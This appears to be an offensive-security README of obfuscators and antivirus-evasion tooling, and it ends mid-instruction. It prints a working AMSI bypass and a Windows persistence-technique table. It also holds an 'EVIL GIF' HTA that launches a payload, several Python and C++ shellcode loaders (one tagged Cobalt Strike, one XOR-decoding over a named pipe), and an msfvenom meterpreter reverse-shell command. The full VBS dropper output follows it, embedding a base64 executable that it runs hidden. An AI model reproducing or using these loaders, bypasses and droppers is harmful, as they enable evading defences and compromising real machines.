# [All Resource Collection Obfuscators](https://github.com/alphaSeclab/all-my-collection-repos)


![amsybypass](https://github.com/Mr-xn/Penetration_Testing_POC/raw/master/img/AMSI_TN_bypass.jpg)

````
$a =[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') 
$h="4456625220575263174452554847" 
$s =[string](0..13|%{[char][int](53+($h).substring(($_*2),2))})-replace " " 
$b =$a.GetField($s,'NonPublic,Static') 
$b.SetValue($null,$true)
````


#### java obfuscator (GUI)
[![java obfuscator](https://i.postimg.cc/NMfLk5Hb/2020-05-22-182054.png)](https://github.com/superblaubeere27/obfuscator)


#### https://github.com/Ekultek/Graffiti

<p align="center"><img width="500" alt="graffitibanner" src="https://user-images.githubusercontent.com/14183473/49157062-8a351500-f2e4-11e8-80cd-00acd809171e.png"></p>

https://www.youtube.com/watch?v=xNhQMwC0BLo&feature=emb_logo

https://github.com/Ekultek/Graffiti

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


#### Powershell_Fernet_Obfuscator

https://github.com/TheEyeOfCyber/FernHunt_WindowsPowershell-Obfuscator



# [SOURCE](https://github.com/topics/obfuscator)

#### Persistence  techniques

|Code     |Technique               |Mitre     |
|---------|------------------------|----------|
|PE-001   |[Winlogon Helper DLL](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)|[T1004](https://attack.mitre.org/techniques/T1004/)|
|PE-002   |[Port Monitors](https://pentestlab.blog/2019/10/28/persistence-port-monitors/)|[T1013](https://attack.mitre.org/techniques/T1013/)|
|PE-003   |[Accessibility Features](https://pentestlab.blog/2019/11/13/persistence-accessibility-features/)|[T1015](https://attack.mitre.org/techniques/T1015/)|
|PE-004   |[Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)|[T1023](https://attack.mitre.org/techniques/T1023/)|
|PE-005   |[Modify Existing Service](https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/)|[T1031](https://attack.mitre.org/techniques/T1031/)|
|PE-006   |[DLL Search Order Hijacking](https://pentestlab.blog/2020/03/04/persistence-dll-hijacking/)|[T1038](https://attack.mitre.org/techniques/T1038/)|
|PE-007   |[Change Default File Association](https://pentestlab.blog/2020/01/06/persistence-change-default-file-association/)|[T1042](https://attack.mitre.org/techniques/T1042/)|
|PE-008   |[New Service](https://pentestlab.blog/2019/10/07/persistence-new-service/)|[T1050](https://attack.mitre.org/techniques/T1050/)|
|PE-009   |[Scheduled Tasks](https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/)|[T1053](https://attack.mitre.org/techniques/T1053/)|
|PE-010   |[Service Registry Permission Weakness](https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/)|[T1058](https://attack.mitre.org/techniques/T1058/)|
|PE-011   |[Registry Run Keys](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)|[T1060](https://attack.mitre.org/techniques/T1060/)|
|PE-012   |[WMI Event Subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)|[T1084](https://attack.mitre.org/techniques/T1084/)|
|PE-013   |[Security Support Provider](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)|[T1101](https://attack.mitre.org/techniques/T1101/)|
|PE-014   |[AppInit DLLs](https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/)|[T1103](https://attack.mitre.org/techniques/T1103/)|
|PE-015   |[Component Object Model Hijacking](https://pentestlab.blog/2020/05/20/persistence-com-hijacking/)|[T1122](https://attack.mitre.org/techniques/T1122/)|
|PE-016   |[Netsh Helper DLL](https://pentestlab.blog/2019/10/29/persistence-netsh-helper-dll/)|[T1128](https://attack.mitre.org/techniques/T1128/)|
|PE-017   |[Office Application Startup](https://pentestlab.blog/2019/12/11/persistence-office-application-startup/)|[T1137](https://attack.mitre.org/techniques/T1137/)|
|PE-018   |[Application Shimming](https://pentestlab.blog/2019/12/16/persistence-application-shimming/)|[T1138](https://attack.mitre.org/techniques/T1138/)|
|PE-019   |[Screensaver](https://pentestlab.blog/2019/10/09/persistence-screensaver/)|[T1180](https://attack.mitre.org/techniques/T1180/)|
|PE-020   |[Image File Execution Options Injection](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)|[T1183](https://attack.mitre.org/techniques/T1183/)|
|PE-021   |[BITS Jobs](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)|[T1197](https://attack.mitre.org/techniques/T1197/)|
|PE-022   |[Time Providers](https://pentestlab.blog/2019/10/22/persistence-time-providers/)|[T1209](https://attack.mitre.org/techniques/T1209/)|
|PE-023   |[PowerShell Profile](https://pentestlab.blog/2019/11/05/persistence-powershell-profile/)|[T1504](https://attack.mitre.org/techniques/T1504/)|
|PE-024   |[Waitfor](https://pentestlab.blog/2020/02/04/persistence-waitfor/)|N/A|
|PE-025   |[RID Hijacking](https://pentestlab.blog/2020/02/12/persistence-rid-hijacking/)|N/A|



#### Blogs

Red Team Tactics: Utilizing Syscalls in C# - Prerequisite Knowledge

https://jhalon.github.io/utilizing-syscalls-in-csharp-1/


#### Tools

- https://github.com/rootm0s/Protectors
- https://github.com/XenocodeRCE/neo-ConfuserEx



Stealing Signatures ПОДПИСЬ

- https://github.com/secretsquirrel/SigThief
- https://gist.github.com/r00t-3xp10it/88d4929fcded15fe22142426aa04a827


- https://github.com/cribdragg3r/Simple-Loader

### B2E

- https://github.com/r00t-3xp10it/PandoraBox
- https://github.com/guillaC/xToBatConverter

#### EVIL GIF

````
<html>
<head>
<title>NazvanieGif</title>
<hta:application id="NazvanieGif"
border="thin"
borderstyle="complex"
maximizeButton="no"
minimizeButton="no"
/>
</head>
<script type="text/javascript">
var index = -1;
var images = [
"data:image/gif;base64,                                             "];
function initGallery(){
window.resizeTo(300,300);
htaPayload();
nextPicture();
}
function nextPicture(){
var img;
index = index + 1;
if (index > images.length -1 ){
index = 0;
}
img = document.getElementById("gallery");
img.src = images[index];
}
function htaPayload(){
var payload="calc.exe";
try{
if (navigator.userAgent.indexOf("Windows") !== -1){
new ActiveXObject("WScript.Shell").Run("CMD /C START /B " + payload, false);
}
}
catch(e){
}
}
</script>
<style>
#gallery, div {
width: 100%;
height: 100%;
}
#outer {
text-align: center;
}
#inner{
display: inline-block;
}
body {
background-color: black;
}
</style>
<body onload="initGallery()">
<div id="outer">
<div id="inner">
<img id="gallery" onclick="nextPicture()">
</div>
</div>
</body>
</html>



````


#### Non-interactive Installation PYTHON

````
msiexec /i python<version>.msi

https://www.python.org/download/releases/2.5/msi/
````

#### [c# Simple-Loader](https://github.com/cribdragg3r/Simple-Loader)

````
# python2
import ctypes

payload = ""
shellcode = bytearray(payload)
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
import ctypes

shellcode =  ""
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
import ctypes

buf =  ""
#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr: 
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
       if 1:
              ctypes.windll.user32.ShowWindow(whnd, 0)   
              ctypes.windll.kernel32.CloseHandle(whnd)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                   	  ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()


____________________________________________________________________________________________________________________
// C++

#include "stdio.h"
#include "windows.h"
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//运行不显示窗口

//shellcode
unsigned char buf[] = "";

void run(void* buffer) {
	void(*function)();
	function = (void (*)())buffer;
	function();
}

void main()
{
	LPVOID ptr = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(ptr, buf, sizeof(buf));
	LPVOID ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
	WaitForSingleObject(ht, -1);
}

____________________________________________________________________________________________________________________

#include "stdio.h"
#include "windows.h"
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma comment(linker, "/section:.data,RWE")

unsigned char buf[] = "";

void main()
{
	__asm
	{
		mov eax, offset buf
		jmp eax
	}
}

____________________________________________________________________________________________________________________
//cobaltstrike

#include "stdio.h"
#include "windows.h"
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma comment(linker, "/section:.data,RWE")

unsigned char buf[] = "";

void run(void* buffer) {
	void(*function)();
	function = (void (*)())buffer;
	function();
}

void main()
{
    LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ptr = HeapAlloc(heapp, 0, sizeof(buf));
    RtlMoveMemory(ptr, buf, sizeof(buf));
    LPVOID ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
    WaitForSingleObject(ht, -1);
}


____________________________________________________________________________________________________________________

#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#define BUFF_SIZE 1024
char buf[] = "";
PTCHAR ptsPipeName = TEXT("\\\\.\\pipe\\BadCodeTest");

BOOL RecvShellcode(VOID){
    HANDLE hPipeClient;
    DWORD dwWritten;
    DWORD dwShellcodeSize = sizeof(buf);
    
    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);
    
    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,NULL);

    if(hPipeClient == INVALID_HANDLE_VALUE){
        printf("[+]Can't Open Pipe , Error : %d \n",GetLastError());
        return FALSE;
    }

    WriteFile(hPipeClient,buf,dwShellcodeSize,&dwWritten,NULL);
    if(dwWritten == dwShellcodeSize){
        CloseHandle(hPipeClient);
        printf("[+]Send Success ! Shellcode : %d Bytes\n",dwShellcodeSize);
        return TRUE;
    }
    CloseHandle(hPipeClient);
    return FALSE;
}


int wmain(int argc, TCHAR * argv[]){

    HANDLE hPipe;
    DWORD dwError;
    CHAR szBuffer[BUFF_SIZE];
    DWORD dwLen;
    PCHAR pszShellcode = NULL;
    DWORD dwOldProtect; 
    HANDLE hThread;
    DWORD dwThreadId;
    //：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
    hPipe = CreateNamedPipe(
        ptsPipeName,
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE| PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        BUFF_SIZE,
        BUFF_SIZE,
        0,
        NULL);

    if(hPipe == INVALID_HANDLE_VALUE){
        dwError = GetLastError();
        printf("[-]Create Pipe Error : %d \n",dwError);
        return dwError;
    }

    CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)RecvShellcode,NULL,NULL,NULL);

    if(ConnectNamedPipe(hPipe,NULL) > 0){
        printf("[+]Client Connected...\n");
        ReadFile(hPipe,szBuffer,BUFF_SIZE,&dwLen,NULL);
        printf("[+]Get DATA Length : %d \n",dwLen);
        
        pszShellcode = (PCHAR)VirtualAlloc(NULL,dwLen,MEM_COMMIT,PAGE_READWRITE);
        
        CopyMemory(pszShellcode,szBuffer,dwLen);

        for(DWORD i = 0;i< dwLen; i++){
            Sleep(50);
            _InterlockedXor8(pszShellcode+i,10);
        }

        
        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&dwOldProtect);
        // Shellcode
        hThread = CreateThread(
            NULL, 
            NULL, 
            (LPTHREAD_START_ROUTINE)pszShellcode, 
            NULL, 
            NULL, 
            &dwThreadId 
        );

        WaitForSingleObject(hThread,INFINITE);
    }

    return 0;
}

````



https://github.com/sayhi2urmom/Antivirus_R3_bypass_demo

![](https://raw.githubusercontent.com/blackc03r/OSCP-Cheatsheets/master/.gitbook/assets/peek-2019-05-07-21-34.gif)
https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon.md


## Execute metasploit vbs payload in cmd shell

If you are a pentester/researcher,  you may want to gain a meterpreter session from a cmd shell at sometimes, ex: (sqlmap --os-shell, or other tools). Ex:

```
$ ncat -l -p 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.  

C:\Documents and Settings\test\Desktop>ver
ver  

Microsoft Windows XP [Version 5.1.2600]
C:\Documents and Settings\test\Desktop>
```

In the previous, you want try the following methods:

  - a. translate exe into a batch script.
  - b. download the payload file from remote server (ftp, tftp, http, ....)
  - c. ....

Now, I'll show you how to run metasploit payload in cmd.exe.  Please try to think about the following questions:

1. How to generate a  payload with msfvenom ?
2. How to run  payload in a simple/compatible way ?

----

## How to generate a  payload with msfvenom ?

In order to test the payload on Windows XP/2003,  we choose the vbs format . If you need help, please try [msfvenom -h]

```
$ msfvenom -p windows/meterpreter/reverse_tcp
 LHOST=192.168.1.100 LPORT=4444 -f vbs --arch x86 --platform win

 No encoder or badchars specified, outputting raw payload
 Payload size: 333 bytes
 Final size of vbs file: 7370 bytes
 Function oSpLpsWeU(XwXDDtdR)
  urGQiYVn = "" & _           
  XwXDDtdR & ""      
  Set gFMdOBBiLZ = CreateObject("MSXML2.DOMDocument.3.0")
  gFMdOBBiLZ.LoadXML(urGQiYVn)
  oSpLpsWeU = gFMdOBBiLZ.selectsinglenode("B64DECODE").nodeTypedValue
  set gFMdOBBiLZ = nothing
 End Function

 Function skbfzWOqR()
  cTENSbYbnWY = "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"
  Dim GBHMAfCsea
  Set GBHMAfCsea = CreateObject("Scripting.FileSystemObject")
  Dim nYosrMtHSIOKSTI
  Dim LNXsqHXEKZQU
  Set nYosrMtHSIOKSTI = GBHMAfCsea.GetSpecialFolder(2)
  LNXsqHXEKZQU = nYosrMtHSIOKSTI & "\" & GBHMAfCsea.GetTempName()
  GBHMAfCsea.CreateFolder(LNXsqHXEKZQU)
  YeQZhbvaLPekFW = LNXsqHXEKZQU & "\" & "QoziwORKliqRDPs.exe"
  Dim voFeIDpffjdo
  Set voFeIDpffjdo = CreateObject("Wscript.Shell")
  WwqoNcaCIbw = oSpLpsWeU(cTENSbYbnWY)
  Set WQwWDbhse = CreateObject("ADODB.Stream")
  WQwWDbhse.Type = 1
  WQwWDbhse.Open
  WQwWDbhse.Write WwqoNcaCIbw
  WQwWDbhse.SaveToFile YeQZhbvaLPekFW, 2
  voFeIDpffjdo.run YeQZhbvaLPekFW, 0, true
  GBHMAfCsea.DeleteFile(YeQZhbvaLPekFW)
  GBHMAfCsea.DeleteFolder(LNXsqHXEKZQU)
End Function

skbfzWOqR
```

## How to run  payload in a simple/compatible way ?

Read the code, we can create a simple vbs script called msf.vbs to execute the shellcode. A vbs script can be executed on Windows XP/2003/Vista/7/8/10/2008/2012/....

```
shellcode = WScript.Arguments.Item(0)
strXML = "" & shellcode & ""
Set oXMLDoc = CreateObject("MSXML2.DOMDocument.3.0")
oXMLDoc.LoadXML(strXML) decode = oXMLDoc.selectsinglenode("B64DECODE").nodeTypedValue
set oXMLDoc = nothing
 Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tempdir
Dim basedir
Set tempdir = fso.GetSpecialFolder(2)
basedir = tempdir & "\" & fso.GetTempName()
fso.CreateFolder(basedir)
tempexe = basedir & "\" & "test.exe"
Dim adodbstream
Set adodbstream = CreateObject("ADODB.Stream")
adodbstream.Type = 1
adodbstream.Open
adodbstream.Write decode
adodbstream.SaveToFile tempexe, 2
Dim wshell
Set wshell = CreateObject("Wscript.Shell")
wshell.run tempexe, 0, true
fso.DeleteFile(tempexe)
fso.DeleteFolder(basedir)

Ok, how to run it in cmd.exe ? Do you want  to paste the code line by line ?  A simple command is created as follow:

```

upload msf.vbs to vuln lab with a single command,

```
